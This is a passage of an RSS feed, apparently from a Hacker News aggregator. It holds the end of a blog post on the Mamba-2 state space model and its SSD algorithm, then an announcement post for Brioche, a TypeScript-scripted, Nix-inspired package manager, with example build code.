because it only uses matrix multiplications, which are extremely optimized on GPUs and TPUs.</p> <h3 id="efficiency-the-ssd-mode">Efficiency: the SSD Mode</h3> <p>So if there are two equivalent ways of computing the same model, when should we use one mode or the other? During inference, there’s no trade-off: the SSM mode is designed for fast autoregressive inference. But what about training? Here there’s a tension between FLOPs and hardware efficiency where the attention mode uses more FLOPs, but uses them more efficiently through matrix multiplications.</p> <figure> <picture> <source srcset="https://tridao.me/assets/img/2024-05-31-mamba-2/ssd_algorithm-480.webp 480w,https://tridao.me/assets/img/2024-05-31-mamba-2/ssd_algorithm-800.webp 800w,https://tridao.me/assets/img/2024-05-31-mamba-2/ssd_algorithm-1400.webp 1400w," sizes="95vw" type="image/webp"> <img src="https://tridao.me/assets/img/2024-05-31-mamba-2/ssd_algorithm.png" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p>It turns out we can get the best of both worlds by combining the algorithms! There are two equivalent interpretations of this “state space dual” algorithm, either as</p> <ol> <li>A block decomposition of a particular structured matrix that defines the SSD “token-mixing” sequence transformation.</li> <li>A “chunkwise” algorithm that splits the sequence into segments, computes the quadratic attention form on each segment, and adjusts the result by passing the SSM states between segments.</li> </ol> <p>We’ll leave the details of this algorithm to <a href="https://tridao.me/blog/2024/mamba2-part3-algorithm/">Part III</a> (or Section 6 of the <a href="https://arxiv.org/abs/2405.21060" rel="external nofollow noopener" target="_blank">full paper</a>), as it requires a bit of machinery from the theory to derive. But we do emphasize that the implementation of this algorithm isn’t too complicated – only ~30 lines of PyTorch, which we provide in the paper (Listing 1) as well as in the <a href="https://github.com/state-spaces/mamba" rel="external nofollow noopener" target="_blank">public repository</a>!</p> <p>The benefits of the SSD algorithm is that it preserves the same efficient FLOP counts as SSMs (compared to quadratic attention), and also dramatically speeds up training compared to general state space models.</p> <table> <thead> <tr> <th>&nbsp;</th> <th>Attention</th> <th>SSM</th> <th>SSD</th> </tr> </thead> <tbody> <tr> <td>State size</td> <td>$\mathrm{T}$</td> <td>$\mathbf{N}$</td> <td>$\mathbf{N}$</td> </tr> <tr> <td>Training FLOPs</td> <td>$\mathrm{T}^2\mathrm{N}$</td> <td>$\mathbf{TN^2}$</td> <td>$\mathbf{TN^2}$</td> </tr> <tr> <td>Inference FLOPs</td> <td>$\mathrm{T}\mathrm{N}$</td> <td>$\mathbf{N^2}$</td> <td>$\mathbf{N^2}$</td> </tr> <tr> <td>(Naive) memory</td> <td>$\mathrm{T}^2$</td> <td>$\mathrm{TN}^2$</td> <td>$\mathbf{TN}$</td> </tr> <tr> <td>Matrix multiplications?</td> <td><img title=":heavy_check_mark:" alt=":heavy_check_mark:" src="https://github.githubassets.com/images/icons/emoji/unicode/2714.png" height="20" width="20"></td> <td><img title=":x:" alt=":x:" src="https://github.githubassets.com/images/icons/emoji/unicode/274c.png" height="20" width="20"></td> <td><img title=":heavy_check_mark:" alt=":heavy_check_mark:" src="https://github.githubassets.com/images/icons/emoji/unicode/2714.png" height="20" width="20"></td> </tr> </tbody> </table> <h2 id="the-mamba-2-architecture">The Mamba-2 Architecture</h2> <p>Although the core contribution of Mamba-2 is the new SSD layer and theory, we also make some small changes to Mamba’s neural network architecture.</p> <figure> <picture> <source srcset="https://tridao.me/assets/img/2024-05-31-mamba-2/architecture_2-480.webp 480w,https://tridao.me/assets/img/2024-05-31-mamba-2/architecture_2-800.webp 800w,https://tridao.me/assets/img/2024-05-31-mamba-2/architecture_2-1400.webp 1400w," sizes="95vw" type="image/webp"> <img src="https://tridao.me/assets/img/2024-05-31-mamba-2/architecture_2.png" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p>The main change is producing the $(A, B, C)$ SSM parameters in parallel with the $X$ input, instead of sequentially. This is partly motivated by the connections to attention; but more pragmatically, it’s simpler and more amenable to scaling techniques such as tensor parallelism, which will be covered in Part IV of this series!</p> <p>There are some other small differences which are covered in more detail in the paper. However, we do want to emphasize that these architectural changes aren’t really the main point of the model.</p> <h3 id="language-modeling">Language Modeling</h3> <p>In terms of empirical results, we didn’t test Mamba-2 as extensively as Mamba-1, but believe it should generally be on par or better. Our full language model results use the same protocol as Mamba, and found slightly better scaling at Chinchilla laws <d-cite key="hoffmann2022empirical"></d-cite>.</p> <figure> <picture> <source srcset="https://tridao.me/assets/img/2024-05-31-mamba-2/pile_8k_mamba2-480.webp 480w,https://tridao.me/assets/img/2024-05-31-mamba-2/pile_8k_mamba2-800.webp 800w,https://tridao.me/assets/img/2024-05-31-mamba-2/pile_8k_mamba2-1400.webp 1400w," sizes="95vw" type="image/webp"> <img src="https://tridao.me/assets/img/2024-05-31-mamba-2/pile_8k_mamba2.png" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p>Fully trained models on the Pile dataset<d-cite key="pile"></d-cite> and the standard zero-shot downstream evaluations show similar trends. We emphasize that even when the performance is comparable, Mamba-2 is <em>much</em> faster to train than Mamba-1!</p> <h3 id="synthetic-language-modeling-mqar">Synthetic Language Modeling: MQAR</h3> <p>More interestingly, we highlight the one synthetic task we tried. Since the original Mamba paper, which investigated synthetics such as Synthetic Copying and Induction Heads, many follow-up works have begun investigating harder associative recall tasks. The <strong>multi-query associative recall (MQAR)</strong> task introduced by the Zoology and Based <d-cite key="arora2024zoology"></d-cite><d-cite key="arora2024simple"></d-cite> line of work has become a de facto standard.</p> <figure> <picture> <source srcset="https://tridao.me/assets/img/2024-05-31-mamba-2/mqar-480.webp 480w,https://tridao.me/assets/img/2024-05-31-mamba-2/mqar-800.webp 800w,https://tridao.me/assets/img/2024-05-31-mamba-2/mqar-1400.webp 1400w," sizes="95vw" type="image/webp"> <img src="https://tridao.me/assets/img/2024-05-31-mamba-2/mqar.png" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p>We ran a version of this task that’s much harder than the one usually reported in the literature, and found that Mamba-2 is substantially better than Mamba-1. One reason for the improved performance is the much larger state size (up to $16\times$ larger than Mamba-1 here), which was one of the primary motivations of Mamba-2 in the first place.</p> <p>Interestingly, Mamba-2 also appears to be noticeably better than Mamba-1 on this particular task even when the state size is controlled. We’re not quite sure why to be honest, and it would be great to ablate the other aspects of the architecture to investigate…</p> <h2 id="next-up">Next Up</h2> <p>In <a href="https://tridao.me/blog/2024/mamba2-part2-theory/">the next part of this series</a>, we’ll go more into the full SSD framework, including how to prove the claimed “duality” of the SSD layer, and strong generalizations of it!</p> </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: Brioche – A new Nix-like package manager (112 pts)]]></title>
            <link>https://brioche.dev/blog/announcing-brioche/</link>
            <guid>40563984</guid>
            <pubDate>Mon, 03 Jun 2024 16:00:04 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://brioche.dev/blog/announcing-brioche/">https://brioche.dev/blog/announcing-brioche/</a>, See on <a href="https://news.ycombinator.com/item?id=40563984">Hacker News</a></p>
<div id="readability-page-1" class="page"><div> <p>I’m super excited to announce the first public release of Brioche! Brioche is a brand new package manager and build tool that builds on top of the best ideas of other package managers, like Nix, Homebrew, and Cargo. It’s designed to be flexible and easy to use, and it leverages TypeScript for fancy typechecking and autocompletions in your build scripts.</p>
<p>I’d consider this release a <strong>Technical Preview</strong>. Currently, it’s limited to x86-64 Linux only, there’s only a small number of packages, and there are still some outstanding issues, including pretty bad performance issues and bugs in the Language Server Protocol implementation. Brioche isn’t really at the point I’d recommend folks use it for Serious Business™ yet… but, everything is <em>working</em>, and I’m finally at the point where I’m ready to get some more eyes on the project.</p>
<blockquote>
<p>If you’ve heard of <a href="https://www.tangram.dev/">Tangram</a> before, Brioche might looks pretty familiar because Brioche heavily borrows ideas from it too. There’s a bit of a history there, which I <a href="#on-tangram">touch on below</a>.</p>
</blockquote>
<p>…Anyway, without further ado, here’s a fairly simple Brioche project file:</p>
<div><figure><pre data-language="ts"><code><div><p><span>// project.bri</span></p></div><div><p><span>// Import dependencies</span></p></div><div><p><span>import</span><span> </span><span>*</span><span> </span><span>as</span><span> std </span><span>from</span><span> </span><span>"</span><span>std</span><span>"</span><span>;</span></p></div><div><p><span>import</span><span> { cargoBuild } </span><span>from</span><span> </span><span>"</span><span>rust</span><span>"</span><span>;</span></p></div><div><p><span>// This will get built by default</span></p></div><div><p><span>export</span><span> </span><span>default</span><span> </span><span>function</span><span> </span><span>app</span><span>()</span><span> {</span></p></div><div><p><span>  </span><span>// Build a Rust project with Cargo</span></p></div><div><p><span>  </span><span>return</span><span> </span><span>cargoBuild</span><span>({</span></p></div><div><p><span>    </span><span>// Import Cargo files to build</span></p></div><div><p><span><span>    </span></span><span>crate: Brioche</span><span>.</span><span>glob</span><span>(</span><span>"</span><span>src</span><span>"</span><span>,</span><span> </span><span>"</span><span>Cargo.*</span><span>"</span><span>)</span><span>,</span></p></div><div><p><span>    </span><span>// Define the path of the default binary to run</span></p></div><div><p><span><span>    </span></span><span>runnable: </span><span>"</span><span>bin/hello</span><span>"</span><span>,</span></p></div><div><p><span><span>  </span></span><span>});</span></p></div><div><p><span>}</span></p></div><div><p><span>// Define an extra export that builds a container</span></p></div><div><p><span>export</span><span> </span><span>function</span><span> </span><span>container</span><span>()</span><span> {</span></p></div><div><p><span>  </span><span>// Wrap the Rust build into an OCI container image</span></p></div><div><p><span>  </span><span>return</span><span> std</span><span>.</span><span>ociContainerImage</span><span>({</span></p></div><div><p><span><span>    </span></span><span>recipe: </span><span>app</span><span>()</span><span>,</span></p></div><div><p><span><span>  </span></span><span>});</span></p></div><div><p><span>}</span></p></div></code></pre></figure></div>
<p>The <code dir="auto">Brioche.glob</code> line imports files from disk next to the <code dir="auto">project.bri</code> file, so this particular script is meant to live alongside an existing Rust project. Besides that, hopefully it’s pretty self-explanatory what’s going on. A few things you can do with this:</p>
<ul>
<li>You can run <code dir="auto">brioche run</code>, which will call the default export function. This returns a <a href="https://brioche.dev/docs/core-concepts/recipes"><strong>recipe</strong></a> that will use the Rust compiler to build the project. Then, Brioche will call the <code dir="auto">bin/hello</code> binary</li>
<li>You can run <code dir="auto">brioche build -e container -o container.tar</code> to call the <code dir="auto">container</code> function. This will build an OCI container image, ready to be imported into either Docker or Podman</li>
<li>You can run <code dir="auto">brioche build -o output/</code> to save a directory containing <code dir="auto">bin/hello</code>. Not just that: this directory will contain all of the runtime dependencies for the project (including glibc)! That means you can send it to another computer, and it’ll run using the exact same dependencies you just ran it with</li>
</ul>
<p>If you want to check out some more examples or if you want to give Brioche a spin yourself, take a look at the <a href="https://brioche.dev/docs">documentation</a>. If you want to see the currently available packages (or just want to explore some real-world Brioche code), check out the <a href="https://github.com/brioche-dev/brioche-packages">brioche-packages repo</a>.</p>
<h2 id="why-write-another-package-manager">Why write another package manager?</h2>
<p>There are <em>lots</em> of tools that cover some or all of the use-cases I had in mind for Brioche: Nix, Bazel, Earthly, Homebrew, asdf, direnv, devenv, tea, and too many more to list. So why spend the time building something new?</p>
<p>Well, first off, it’s fun! Brioche has been one of my favorite projects to work on. Rust and TypeScript are my two favorite languages to write, and I love the fairly low-level nature of working with compiler toolchains (even if dealing with autotools is endlessly frustrating…)</p>
<p>Second, Nix. A long long time ago (circa 2016), I daily drove NixOS and even briefly maintained a package in the Nixpkgs repo. I was really sold on Nix’s ideas, but I eventually abandoned it because I ended up feeling pretty frustrated when using it. I learned Nix-the-language pretty in-depth, but it never really felt intuitive to me. Derivations always felt weirdly rigid. I didn’t like that the Nixpkgs repo as a whole is versioned as one unit instead of individual packages. I didn’t like how much work I had to put in to get stuff that just works out-of-the-box everywhere else to work on NixOS: I felt like my tools work working <em>against</em> me instead of <em>for</em> me.</p>
<p>2016 was 8 years ago now, and I know the Nix ecosystem has evolved a lot since then. I know Flakes are supposed to be a game changer, there are lots more packages and resources for using Nix, and the core tooling has certainly been improved a lot since then. But it was this experience that planted the idea for Brioche in my head, and I couldn’t shake the feeling that, starting from scratch, I could design something less quirky than Nix while keeping its best features.</p>
<h2 id="whats-in-store-for-brioche">What’s in store for Brioche</h2>
<p>In the short term, there’s lots of things I want to get done: improve performance (I have a lot of ideas here), add more packages, make it easier to do more exotic builds, get Brioche working on more platforms, etc.</p>
<p>In the long term, I want Brioche to be the best way to manage your software projects. I end up finding myself mixing and matching lots of tools in weird ways: I’ve had projects that mix Rust and TypeScript, Rust and ffmpeg, Rust and Swift, Rust and the Windows API, Rust and Godot, Rust and SDL2, etc. (did I mention I like Rust?)</p>
<p>My dream is that I could use Brioche for all of these projects. I want to make a project and have all of its external dependencies tracked in a lockfile. I want to run one command that takes care of building, seeding my test databases, checking formatting, then starting a server in watch mode with my database running alongside. I want to use the same build configuration locally, for a container image, and for CI builds. And I want it to work without virtualization whether I’m using Windows on my desktop, macOS on my laptop, or Linux on the server (and Linux on the desktop when I can finally run all the games I want through Proton)</p>

<p>The Nix community has recently <a href="https://lwn.net/Articles/970824/">been going through Something</a>. My decision to build Brioche was in no way a reaction to the recent fallout around Nix. I still have a ton of respect for Nix as a community, and I’m genuinely rooting for them to establish a solid governance model that puts the community first so Nix-the-project can thrive.</p>
<h2 id="on-tangram">On Tangram</h2>
<p><a href="https://www.tangram.dev/">Tangram</a> is another package manager that has a lot of overlap with Brioche: it’s heavily Nix-inspired, it uses TypeScript for build scripts, it’s written in Rust, and generally Brioche build scripts look pretty similar to Tangram build scripts. At the time of writing, Tangram hasn’t yet been released, but it’s due to release very soon.</p>
<p>The similarities between Tangram and Brioche aren’t a coincidence: I worked for Tangram, Inc. starting in October 2022 to April 2023, when I was fired (I felt I was fired unfairly, but this isn’t the time or place for that story). I had been working on Brioche before my time there, and I decided to resume it some time after I was fired.</p>
<p>There were design decisions made at Tangram that I thought worked really well, and some I thought didn’t work so well, so I simply incorporated what I learned at Tangram into the current iteration of Brioche. I think it’s fair to say that Brioche is, ethically, a fork of Tangram, even though haven’t used any code from Tangram directly (although I am still using some prebuilt static Busybox/Dash/env binaries that Tangram built/published). This is also why the <a href="https://github.com/brioche-dev/brioche/blob/2dd8b881b68adb090c5115e245c3dbc1ee605e6c/LICENSE.md">Brioche license</a> includes a copyright notice from Tangram.</p>
<p>So, why build Brioche rather than just using Tangram when it comes out? Basically, my time at Tangram, Inc. led me to believe pretty strongly that Tangram hits <em>most</em> of what I want from a package manager, but I don’t believe it hits <em>everything</em> I have in mind for Brioche (and vice versa, there certainly will be things Tangram can do that Brioche won’t be able to do and aren’t part of my long-term goals for the project). Said another way, I think both Tangram and Brioche have their own goals and will have their own niches to fill.</p>
<p>I also chose to start from a fresh codebase rather than forking. I felt that starting from scratch would let me re-evaluate some fundamental design decisions. Even though the up-front cost was higher, it also let me iterate faster in the long-run.</p> </div></div>]]></description>
        </item>
    </channel>
</rss>